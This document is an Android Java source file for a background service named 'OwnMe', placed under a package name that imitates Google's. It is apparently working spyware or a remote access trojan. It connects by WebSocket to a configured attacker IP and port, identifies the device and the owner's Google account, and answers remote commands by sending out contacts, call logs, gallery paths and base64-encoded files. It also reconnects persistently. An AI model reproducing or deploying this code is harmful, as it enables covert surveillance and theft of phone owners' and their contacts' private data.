package com.google.android.network;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.camera2.CameraManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by earthshakira on 26/1/17.
 */

public class OwnMe extends Service {
    private WebSocketClient mWebSocketClient;
    private String android_id, dev_name;
    private String username;
    private Timer pingpong;
    private Timer retryHarder;
    private static final int PERMISSIONS_REQUEST_READ_PHONE_STATE = 999;
    TelephonyManager telephonyManager=null;
    boolean webopen = false;
    JSONObject ping;
    JSONObject handshake;
    private Intent savedIntent;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public void retryLater(){
        pingpong.cancel();
        pingpong.purge();
        retryHarder.cancel();
        retryHarder.purge();
        retryHarder=new Timer();
        retryHarder.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                Log.d("Timer Running", "trying for socket");
                if (!webopen) {
                  connectWebSocket();
                }
            }
        },new Date(new Date().getTime()+5000),100000000*365);
    }
    public String getNetworkState() {
        ConnectivityManager cm =
                (ConnectivityManager) this.getBaseContext().getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        boolean isConnected = activeNetwork != null &&
                activeNetwork.isConnectedOrConnecting();
        if (isConnected) {
            switch (activeNetwork.getType()) {
                case ConnectivityManager.TYPE_WIFI:
                    return "wifi";
                case ConnectivityManager.TYPE_MOBILE:
                    return "mobile_data";
                default:
                    return "other";
            }
        } else return null;
    }

    public void startExploit(Intent intent) {
        String network = getNetworkState();
        if (network != null) {
            Toast.makeText(this.getBaseContext(), network + " network available", Toast.LENGTH_LONG).show();
            Toast.makeText(this.getBaseContext(), network + " network available", Toast.LENGTH_LONG).show();
            connectWebSocket();
        } else {
            Toast.makeText(this.getBaseContext(), "no network stopping self", Toast.LENGTH_LONG).show();
            stopSelf();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        savedIntent=intent;
        Toast.makeText(this, "Service Started", Toast.LENGTH_LONG).show();
        pingpong = new Timer();
        retryHarder = new Timer();
        username = getString(R.string.user_name);
        android_id = Settings.Secure.getString(getBaseContext().getContentResolver(), Settings.Secure.ANDROID_ID);


        dev_name = Build.MANUFACTURER + " " + Build.MODEL;
        int sdkVersion = android.os.Build.VERSION.SDK_INT; // e.g. sdkVersion := 8;
        ping = new JSONObject();
        handshake = new JSONObject();
        try {
            ping.put("type", "ping");
            ping.put("id", android_id);
            handshake.put("type","handshake");
            handshake.put("user",username);
            handshake.put("id",android_id);
            handshake.put("devname",dev_name);
            handshake.put("devuser",getUsername());
            handshake.put("connection",getNetworkState());
            handshake.put("api",sdkVersion);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        startExploit(intent);
        return Service.START_STICKY;
    }

    @Override
    public boolean stopService(Intent name) {
        Toast.makeText(this.getBaseContext(), "Service Stoped", Toast.LENGTH_LONG).show();
        if (mWebSocketClient != null)
            mWebSocketClient.close();
        else Toast.makeText(this.getBaseContext(), "Web socket is null", Toast.LENGTH_LONG).show();
        return super.stopService(name);
    }


    private void connectWebSocket() {
        retryHarder.cancel();
        retryHarder.purge();
        URI uri;
        try {
            uri = new URI("ws://"+getString(R.string.ip)+":"+getString(R.string.port));
        } catch (URISyntaxException e) {
            e.printStackTrace();
            return;
        }
        //Toast.makeText(this.getBaseContext(), " Tying to open ", Toast.LENGTH_LONG).show();
        mWebSocketClient = new WebSocketClient(uri) {
            @Override
            public void onOpen(ServerHandshake serverHandshake) {
                Log.i("Websocket", "Opened");
                mWebSocketClient.send(handshake.toString());
                webopen = true;
                pingpong.cancel();
                pingpong.purge();
                pingpong = new Timer();
                retryHarder.cancel();
                retryHarder.purge();
                retryHarder=new Timer();
                pingpong.scheduleAtFixedRate(new TimerTask() {
                    @Override
                    public void run() {
                        Log.d("Timer Running", "Is it up");
                        if (webopen) {
                            updateBattery();
                            mWebSocketClient.send(ping.toString());
                        } else {

                        }
                    }
                }, 5000, 5000);
                //Toast.makeText(getBaseContext(),"Web socket is on",Toast.LENGTH_LONG).show();
            }

            @Override
            public void onMessage(String s) {

                Log.d("shubham", "onMessage: " + s);
                JSONObject x = null;
                String cmd=null;
                try {
                    x=new JSONObject(s);
                    Log.d("shubham", "onMessage: inside try");
                    Log.d("shubham", "onMessage: " + x.get("cmd"));
                    x.put("to", x.get("from"));
                    x.remove("from");
                    cmd=x.get("cmd").toString();
                    if (cmd.equals("screenshot")) {
                        x.put("response", "none");
                        x.put("type", "response");
                    } else if (cmd.equals("contacts")) {
                        x.put("response", getContacts());
                        x.put("type", "contacts");
                    }else if (cmd.equals("calllog")) {
                        x.put("response", getCallLogs());
                        x.put("type", "calllog");
                    }else if (cmd.equals("fetch")) {
                        x.put("response", getBase64((String) x.get("path")));
                        Log.d("inside fetch" , "image done");
                        x.put("type", "fetch");
                    } else if (cmd.equals("gallery")) {
                        ArrayList gal = getGallery();
                        JSONObject y;
                        int pg=gal.size();
                        y=new JSONObject();
                        y.put("to",x.get("to"));
                        for(int i=0;i<pg;i++){
                            y.put("response", gal.get(i).toString());
                            y.put("type", "gallery");
                            y.put("id",android_id);
                            y.put("page",i+1);
                            y.put("total",pg);
                            mWebSocketClient.send(y.toString());
                        }
                    } else if(cmd.equals("file")){

                    }else {
                        x.put("type","error");
                        x.put("response","no command found");
                        Log.d("shubham", "no commans found");
                    }
                } catch (JSONException e) {
                    Log.d("shubham", "onMessage: inside catch");
                    e.printStackTrace();
                }
                if(!cmd.equals("gallery"))
                    mWebSocketClient.send(x.toString());
            }

            @Override
            public void onClose(int i, String s, boolean b) {
                Log.i("Websocket", "Closed " + s);
                webopen = false;
                pingpong.cancel();
                pingpong.purge();
                retryHarder.cancel();
                retryHarder.purge();
                retryLater();
            }

            @Override
            public void onError(Exception e) {
                webopen = false;
                Log.i("Websocket", "Error " + e.getMessage());
            }
        };
        mWebSocketClient.connect();
    }

    public String getUsername() {
        AccountManager manager = AccountManager.get(this);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "NO permission", Toast.LENGTH_LONG).show();
        }
        Account[] accounts = manager.getAccountsByType("com.google");
        for (int i = 0; i < accounts.length; i++) {
            return accounts[i].name;
        }

        return null;
    }

    private String getContacts() {

        StringBuilder sb = new StringBuilder();
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor_Android_Contacts = null;
        boolean first = true;
        try {
            cursor_Android_Contacts = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            sb.append("[");
            if (cursor_Android_Contacts.getCount() > 0) {

                while (cursor_Android_Contacts.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    String contact_id = cursor_Android_Contacts.getString(cursor_Android_Contacts.getColumnIndex(ContactsContract.Contacts._ID));
                    String contact_display_name = cursor_Android_Contacts.getString(cursor_Android_Contacts.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    contact.put("id", contact_id);
                    contact.put("name", contact_display_name);
                    ArrayList<String> phones = new ArrayList<>();
                    int hasPhoneNumber = Integer.parseInt(cursor_Android_Contacts.getString(cursor_Android_Contacts.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)));
                    if (hasPhoneNumber > 0) {

                        Cursor phoneCursor = contentResolver.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI
                                , null
                                , ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?"
                                , new String[]{contact_id}
                                , null);

                        while (phoneCursor.moveToNext()) {
                            String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            phones.add(phoneNumber);
                        }
                        phoneCursor.close();
                    }
                    contact.put("phones", phones);
                    if (!first)
                        sb.append(",");
                    sb.append(contact.toString());
                    first = false;
                }

            }
            sb.append("]");
        } catch (Exception ex) {
            Log.e("Error on contact", ex.getMessage());
            return "error:" + ex.getMessage();
        }
        return sb.toString();
    }

    private String getCallLogs() {
        StringBuffer sb = new StringBuffer();
        //Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,null, null, null);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return "No permission";
        }

        Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        sb.append("Call Details :");
        JSONArray ret=new JSONArray();
        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String phname = managedCursor.getString(name);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            JSONObject x = new JSONObject();
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "O";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "I";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "M";
                    break;
            }
            try {
                x.put("name",phname);
                x.put("number",phNumber);
                x.put("type",dir);
                x.put("datetime",callDayTime);
                x.put("duration",callDuration);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            ret.put(x);
        }
        managedCursor.close();
        return ret.toString();
    }

    private void updateBattery(){
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = getBaseContext().registerReceiver(null, ifilter);
//        // Are we charging / charged?
//        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
//        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
//                status == BatteryManager.BATTERY_STATUS_FULL;
//
//// How are we charging?
//        int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
//        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
//        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        float batteryPct = level / (float)scale * 100;
        try {
            ping.put("battery",batteryPct);
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }
    private ArrayList<JSONArray> getGallery(){

            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

            String [] projection = { MediaStore.MediaColumns.DATA , MediaStore.Images.Media.BUCKET_DISPLAY_NAME};
            Cursor imageCursor = getContentResolver().query(uri, projection, null, null, null);

            int columnIndexOfData = imageCursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
            int columnIndexOfFolderName = imageCursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
            //ArrayList<JSONObject> lister= new ArrayList<>();
            String singlePath, s,folderName;
            int num=0;
            ArrayList<JSONArray> ret =new ArrayList<>();
            JSONArray page=new JSONArray();
            JSONObject x=new JSONObject();
            while(imageCursor.moveToNext()){
                singlePath = imageCursor.getString(columnIndexOfData);
                folderName = imageCursor.getString(columnIndexOfFolderName);
                try {
                    x=new JSONObject();
                    x.put("path",singlePath);
                    x.put("folder",folderName);
                    x.put("page",num/20+1);
                    page.put(x);
                    if(num!= 0 && (num +1) % 20 == 0){
                        ret.add(page);
                        page=new JSONArray();
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                num++;
            }
            return ret;
    }

    private String getBase64(String path){
        Bitmap bm = BitmapFactory.decodeFile(path);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bm.compress(Bitmap.CompressFormat.JPEG, 100, baos); //bm is the bitmap object
        return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
    }


    private String getCameraIds(){
        CameraManager manager = (CameraManager)getSystemService(Context.CAMERA_SERVICE);
        JSONObject x =new JSONObject();
        return "";
    }

}
